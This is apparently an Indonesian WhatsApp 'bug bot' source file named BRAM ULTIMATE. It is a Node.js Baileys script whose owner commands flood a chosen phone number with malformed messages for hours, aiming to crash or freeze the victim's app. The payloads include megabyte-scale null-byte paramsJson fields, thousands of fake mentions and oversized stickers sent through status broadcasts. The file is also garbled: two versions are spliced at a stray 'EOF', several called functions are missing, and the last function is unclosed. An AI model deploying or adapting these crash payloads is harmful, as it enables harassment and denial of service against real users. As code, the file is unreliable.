
// ============================================================
// BRAM ULTIMATE — PAIRING CODE VERSION
// 🔥 PASTI JALAN!
// ============================================================

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const readline = require('readline');

const CONFIG = {
    owner: ['6285379307765@s.whatsapp.net'],
    botName: 'BRAM ULTIMATE',
    prefix: '.'
};

function isOwner(number) { return CONFIG.owner.includes(number); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============================================================
// BUG FUNCTIONS (SIMPLE)
// ============================================================
async function sendSimpleBug(sock, target, sender) {
    try {
        await sock.sendMessage(sender, { text: '🔥 *BRAM ULTIMATE BUG*\n📱 Target: ' + target });
        for (let i = 0; i < 10; i++) {
            try {
                await sock.sendMessage(target, { 
                    text: '💀 BUG ' + i + '\n' + '\n'.repeat(5000) + '🔥'.repeat(1000)
                });
            } catch (e) {}
            await sleep(100);
        }
        await sock.sendMessage(sender, { text: '✅ *BUG SENT!*' });
        return true;
    } catch (e) {
        await sock.sendMessage(sender, { text: '❌ Error: ' + e.message });
        return false;
    }
}

// ============================================================
// MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    try {
        const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
        if (!text) return;
        const cmd = text.toLowerCase().trim();
        const prefix = CONFIG.prefix;
        
        if (!isOwner(sender)) {
            await sock.sendMessage(sender, { text: '❌ *AKSES DITOLAK!*\nHanya owner yang bisa pakai.' });
            return;
        }
        
        if (cmd === prefix + 'menu' || cmd === prefix + 'help') {
            await sock.sendMessage(sender, {
                text: '💀 *BRAM ULTIMATE*\n👤 @Bramz\n\n📋 PERINTAH:\n' + prefix + 'bug [nomor] — Kirim bug\n' + prefix + 'ping — Cek koneksi\n' + prefix + 'status — Cek status'
            });
            return;
        }
        
        if (cmd === prefix + 'ping') {
            await sock.sendMessage(sender, { text: '🏓 *PONG!*' });
            return;
        }
        
        if (cmd === prefix + 'status') {
            await sock.sendMessage(sender, { text: '✅ *ONLINE*\n👑 Owner: ' + CONFIG.owner.join(', ') });
            return;
        }
        
        if (cmd.startsWith(prefix + 'bug ')) {
            const target = cmd.replace(prefix + 'bug ', '').trim();
            if (!target || target.length < 10) {
                await sock.sendMessage(sender, { text: '❌ Format: .bug 6281234567890' });
                return;
            }
            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
            await sock.sendMessage(sender, { text: '☢️ Sending bug to ' + target });
            setTimeout(async () => await sendSimpleBug(sock, targetJid, sender), 100);
            return;
        }
        
        if (!isGroup) {
            await sock.sendMessage(sender, { text: '🤖 Bot aktif! Ketik .menu' });
        }
    } catch (e) { console.error(e.message); }
}

// ============================================================
// START BOT — PAIRING CODE
// ============================================================
let sock = null, isConnected = false;

async function startBot() {
    console.log('🔥 BRAM ULTIMATE STARTING...');
    try {
        if (!fs.existsSync('./auth')) fs.mkdirSync('./auth', { recursive: true });
        
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            browser: ['BRAM ULTIMATE', 'Chrome', '13.0'],
            logger: pino({ level: 'silent' })
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
            if (connection === 'open') {
                isConnected = true;
                console.log('✅ BOT CONNECTED!');
                console.log('💀 BRAM ULTIMATE ACTIVE');
                console.log('📋 Ketik .menu di WhatsApp');
            }
            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                console.log('❌ Disconnected:', statusCode);
                if (statusCode !== DisconnectReason.loggedOut) {
                    setTimeout(startBot, 5000);
                }
            }
        });
        
        sock.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const msg = messages[0];
                if (!msg.message || msg.key.fromMe || !msg.key.remoteJid) return;
                const sender = msg.key.remoteJid;
                const isGroup = sender.includes('@g.us');
                const senderJid = isGroup ? msg.key.participant : sender;
                if (senderJid) await handleMessage(sock, msg, senderJid, isGroup);
            } catch (e) {}
        });
        
        // === PAIRING CODE ===
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        const question = (query) => new Promise((resolve) => rl.question(query, resolve));
        
        console.log('📱 Masukkan nomor WhatsApp (contoh: 6281234567890):');
        const phoneNumber = await question('> ');
        rl.close();
        
        if (!phoneNumber || phoneNumber.length < 10) {
            console.log('❌ Nomor tidak valid!');
            process.exit(1);
        }
        
        console.log('⏳ Menghubungkan ke WhatsApp...');
        
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                console.log('╔═══════════════════════════════════════╗');
                console.log('║   📱 *PAIRING CODE*                  ║');
                console.log('║                                     ║');
                console.log(`║   🔢 ${code} ║`);
                console.log('║                                     ║');
                console.log('║   ⚡ Masukkan kode di WhatsApp!     ║');
                console.log('║   📱 Buka WhatsApp → Link Devices   ║');
                console.log('╚═══════════════════════════════════════╝');
            } catch (e) {
                console.log('❌ Gagal mendapatkan pairing code:', e.message);
            }
        }, 3000);
        
        return sock;
    } catch (e) {
        console.error('Error:', e.message);
        setTimeout(startBot, 10000);
        return null;
    }
}

startBot();
EOFeMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }
            }
        };
        await sock.relayMessage("status@broadcast", msg, {
            statusJidList: [X],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: X } }]
                }]
            }]
        });
        return true;
    } catch (e) { return false; }
}

// 6. FORCE BITTER SPAM
async function ForceBitterSpam(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "💀 BRAM ULTIMATE " + "🔥".repeat(5000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(500000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 7. FORCE COMMUNITY
async function ForceComunity(sock, X) {
    try {
        const msg = {
            interactiveResponseMessage: {
                body: {
                    text: "🔥 BRAM ULTIMATE COMMUNITY " + "\n".repeat(8000),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: "\u0000".repeat(500000),
                    version: 3
                },
                entryPointConversionSource: "call_permission_message"
            }
        };
        await sock.relayMessage(X, msg, {});
        return true;
    } catch (e) { return false; }
}

// 8. STICK FORCLOSE
async function StickForclose(sock, X) {
    try {
        const msg = {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                mimetype: "image/webp",
                height: 9999,
                width: 9999,
                directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                fileLength: 12260,
                mediaKeyTimestamp: "1743832131",
                isAnimated: false,
                stickerSentTs: "X",
                isAvatar: false,
                isAiSticker: false,
                isLottie: false,
                contextInfo: {
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                    ],
                    stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }
            }
        };
        await sock.relayMessage("status@broadcast", msg, {
            statusJidList: [X],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: X } }]
                }]
            }]
        });
        return true;
    } catch (e) { return false; }
}

// 9. RFP TARSAX
async function RFPTarsax(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "☢️ BRAM ULTIMATE RFP " + "💀".repeat(3000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(700000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 10. CRASH UI
async function CrashUi(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "💥 CRASH UI " + "🔄".repeat(5000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(800000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 11. FCANDROHARD
async function Fcandrohard(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "🤖 FCANDROHARD " + "🔧".repeat(4000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(900000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 12. BLANK PACK
async function BlankPack(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⬜ BLANK PACK " + " ".repeat(10000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(600000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 13. XPROTEX BLANK CHAT V4
async function XProtexBlankChatV4(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "🛡️ XPROTEX BLANK " + "⬜".repeat(3000),
                            format: "DEFAULT"
          },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(500000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// ============================================================
// 📋 COMBINED BUG FUNCTIONS
// ============================================================

async function Crashandroid(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ Crashandroid Selesai!');
            return;
        }
        try {
            if (count < 50) {
                await Promise.all([
                    ForceNoClick(sock, X), ForceNoClick(sock, X), ForceNoClick(sock, X),
                    ForceNoClick(sock, X), ForceNoClick(sock, X), ForceNoClick(sock, X),
                    ForceNoClick(sock, X), ForceNoClick(sock, X), ForceNoClick(sock, X),
                    await sleep(1000)
                ]);
                console.log('🔥 Crashandroid ' + (count+1) + '/50');
                count++;
                setTimeout(sendNext, 4000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function DelayBapakLo(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ DelayBapakLo Selesai!');
            return;
        }
        try {
            if (count < 50) {
                await Promise.all([
                    DelayPayment(sock, X),
                    ObsidianCorexDelayBeta(sock, X),
                    ObsidianCorexDelayBeta(sock, X),
                    DelayPayment(sock, X),
                    ObsidianCorexDelayBeta(sock, X),
                    await sleep(4000)
                ]);
                console.log('🟡 DelayBapakLo ' + (count+1) + '/50');
                count++;
                setTimeout(sendNext, 90000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function Forclose(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ Forclose Selesai!');
            return;
        }
        try {
            if (count < 50) {
                await Promise.all([
                    StickerSplit(sock, X), StickerSplit(sock, X), StickerSplit(sock, X),
                    StickerSplit(sock, X), StickerSplit(sock, X),
                    await sleep(3000),
                    ForceBitterSpam(sock, X),
                    StickerSplit(sock, X),
                    ForceBitterSpam(sock, X), ForceBitterSpam(sock, X), ForceBitterSpam(sock, X),
                    await sleep(9000),
                    StickForclose(sock, X), StickForclose(sock, X), StickForclose(sock, X),
                    ForceComunity(sock, X), ForceComunity(sock, X),
                    await sleep(3000),
                    RFPTarsax(sock, X), RFPTarsax(sock, X), RFPTarsax(sock, X),
                    ForceComunity(sock, X), ForceComunity(sock, X),
                    await sleep(5600)
                ]);
                console.log('💥 Forclose ' + (count+1) + '/50');
                count++;
                setTimeout(sendNext, 2000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function StuckHome(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ StuckHome Selesai!');
            return;
        }
        try {
            if (count < 200) {
                await Promise.all([
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    await sleep(4000),
                    BlankPack(sock, X), BlankPack(sock, X), BlankPack(sock, X),
                    CrashUi(sock, X), CrashUi(sock, X), CrashUi(sock, X),
                    Fcandrohard(sock, X),
                    await sleep(3000),
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    await sleep(4000),
                    BlankPack(sock, X), BlankPack(sock, X), BlankPack(sock, X),
                    CrashUi(sock, X), CrashUi(sock, X), CrashUi(sock, X),
                ]);
                console.log('☢️ StuckHome ' + (count+1) + '/200');
                count++;
                setTimeout(sendNext, 3000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function BomBug(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ BomBug Selesai!');
            return;
        }
        try {
            if (count < 200) {
                await Promise.all([
                    VerloadHardCore(sock, X),
                    await sleep(5000)
                ]);
                console.log('💣 BomBug ' + (count+1) + '/200');
                count++;
                setTimeout(sendNext, 700);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

// ============================================================
// 📋 MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    try {
        const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
        if (!text) return;
        const cmd = text.toLowerCase().trim();
        const prefix = CONFIG.prefix;
        
        if (!isOwner(sender)) {
            await sock.sendMessage(sender, { text: '❌ *AKSES DITOLAK!*\nHanya owner yang bisa pakai.' });
            return;
        }
        
        if (cmd === prefix + 'menu' || cmd === prefix + 'help') {
            await sock.sendMessage(sender, {
                text: '💀 *BRAM ULTIMATE*\n👤 @Bramz\n\n📋 *🔥 BUG VARIANTS:*\n\n' + prefix + 'crash [nomor] — Crash Android\n' + prefix + 'delay [nomor] — Delay Bapak Lo\n' + prefix + 'forclose [nomor] — Forclose\n' + prefix + 'stuck [nomor] — Stuck Home\n' + prefix + 'bomb [nomor] — Bom Bug\n\n📡 *UTILITY:*\n' + prefix + 'ping — Cek koneksi\n' + prefix + 'status — Cek status'
            });
            return;
        }
        
        if (cmd === prefix + 'ping') {
            await sock.sendMessage(sender, { text: '🏓 *PONG!*' });
            return;
        }
        
        if (cmd === prefix + 'status') {
            await sock.sendMessage(sender, { text: '✅ *ONLINE*\n👑 Owner: ' + CONFIG.owner.join(', ') });
            return;
        }
        
        // BUG COMMANDS
        const bugCommands = {
            'crash': Crashandroid,
            'delay': DelayBapakLo,
            'forclose': Forclose,
            'stuck': StuckHome,
            'bomb': BomBug
        };
        
        for (const [key, func] of Object.entries(bugCommands)) {
            if (cmd.startsWith(prefix + key + ' ')) {
                const target = cmd.replace(prefix + key + ' ', '').trim();
                if (!target || target.length < 10) {
                    await sock.sendMessage(sender, { text: '❌ Format: .' + key + ' 6281234567890' });
                    return;
                }
                let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
                await sock.sendMessage(sender, { text: '☢️ *' + key.toUpperCase() + '* to ' + target });
                setTimeout(async () => await func(sock, 24, targetJid), 100);
                return;
            }
        }
        
        if (!isGroup) {
            await sock.sendMessage(sender, { text: '🤖 Bot aktif! Ketik .menu' });
        }
    } catch (e) { console.error(e.message); }
}

// ============================================================
// START BOT
// ============================================================
let sock = null, isConnected = false, reconnectAttempts = 0;

async function startBot() {
    console.log('🔥 BRAM ULTIMATE STARTING...');
    try {
        if (!fs.existsSync('./auth')) fs.mkdirSync('./auth', { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['BRAM ULTIMATE', 'Chrome', '13.0'],
            logger: pino({ level: 'silent' })
        });
        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', async ({ connection, qr }) => {
    if (qr) { 
        console.log('📱 SCAN QR CODE:'); 
        console.log(qr); 
    }
    if (connection === 'open') {
        isConnected = true;
        console.log('✅ BOT CONNECTED!');
        console.log('💀 BRAM ULTIMATE ACTIVE');
        console.log('📋 Ketik .menu di WhatsApp');
    }
});

// === TAMBAHKAN PAIRING CODE ===
const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const question = (query) => new Promise((resolve) => rl.question(query, resolve));

console.log('📱 Masukkan nomor WhatsApp (contoh: 6281234567890):');
const phoneNumber = await question('> ');
rl.close();

if (!phoneNumber || phoneNumber.length < 10) {
    console.log('❌ Nomor tidak valid!');
    process.exit(1);
}

console.log('⏳ Menghubungkan ke WhatsApp...');

setTimeout(async () => {
    try {
        const code = await sock.requestPairingCode(phoneNumber);
        console.log('╔═══════════════════════════════════════╗');
        console.log('║   📱 *PAIRING CODE*                  ║');
        console.log('║                                     ║');
        console.log(`║   🔢 ${code} ║`);
        console.log('║                                     ║');
        console.log('║   ⚡ Masukkan kode di WhatsApp!     ║');
        console.log('║   📱 Buka WhatsApp → Link Devices   ║');
        console.log('╚═══════════════════════════════════════╝');
    } catch (e) {
        console.log('❌ Gagal mendapatkan pairing code:', e.message);
    }
}, 3000);
